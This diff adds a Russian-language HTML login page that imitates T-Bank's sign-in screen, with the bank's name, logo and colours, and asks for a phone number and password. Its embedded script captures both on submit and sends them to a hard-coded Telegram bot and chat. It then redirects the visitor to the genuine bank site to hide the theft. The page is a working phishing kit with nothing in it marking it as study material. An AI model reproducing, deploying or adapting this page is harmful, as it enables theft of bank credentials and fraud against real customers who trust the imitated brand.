@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Т-Банк — Вход</title>
+<meta property="og:title" content="Т-Банк">
+<meta property="og:description" content="Вход в личный кабинет Т-Банка">
+<meta property="og:image" content="https://www.tbank.ru/favicon.ico">
+<meta property="og:url" content="https://твой-домен.com">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+body { background: #fff; color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+.container { width: 100%; max-width: 400px; padding: 40px 20px; text-align: center; }
+.logo { width: 140px; height: auto; margin: 0 auto 30px; display: block; }
+h1 { font-size: 26px; margin-bottom: 10px; color: #000; }
+p { color: #666; font-size: 15px; margin-bottom: 30px; }
+input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 10px; background: #f5f5f5; color: #333; font-size: 16px; outline: none; }
+input:focus { border-color: #ffdd2d; background: #fff; }
+button { width: 100%; padding: 14px; background: #ffdd2d; color: #000; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; }
+button:hover { background: #f5c800; }
+.footer { margin-top: 20px; color: #999; font-size: 13px; }
+</style>
+</head>
+<body>
+<div class="container">
+<img src="https://www.tbank.ru/favicon.ico" alt="Т-Банк" class="logo">
+<h1>Вход в Т-Банк</h1>
+<p>Введите номер телефона для входа</p>
+<form id="loginForm">
+<input type="text" name="phone" placeholder="Номер телефона" required>
+<input type="password" name="password" placeholder="Пароль" required>
+<button type="submit">Войти</button>
+</form>
+<div class="footer">Т-Банк — онлайн-банк</div>
+</div>
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  var phone = document.querySelector('input[name="phone"]').value;
+  var pass = document.querySelector('input[name="password"]').value;
+  var token = '8374650070:AAGzjKVuATwofDM9ngx-TYIDH1Myizc0LZg';
+  var chat = '7887003990';
+  fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(phone + ':' + pass));
+  window.location.href = 'https://www.tbank.ru';
+});
+</script>
+</body>
+</html>
